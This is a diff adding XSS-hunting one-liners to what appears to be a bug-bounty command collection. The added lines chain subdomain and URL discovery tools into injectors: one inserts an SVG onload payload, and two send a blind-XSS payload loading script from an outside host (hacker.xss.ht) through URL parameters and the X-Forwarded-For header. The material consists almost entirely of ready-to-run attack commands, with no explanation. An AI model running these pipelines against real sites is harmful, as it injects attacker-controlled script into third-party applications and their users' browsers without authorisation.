@@ -22,3 +22,21 @@ gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css
 ```
 gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
 ```
+
+## XSS hunting multiple
+> @ofjaaah
+```
+gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+```
+
+## BXSS - Bling XSS in Parameters
+> [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
+```
+subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameter
+```
+
+## Blind XSS In X-Forwarded-For Header
+> [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
+```
+subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
+```
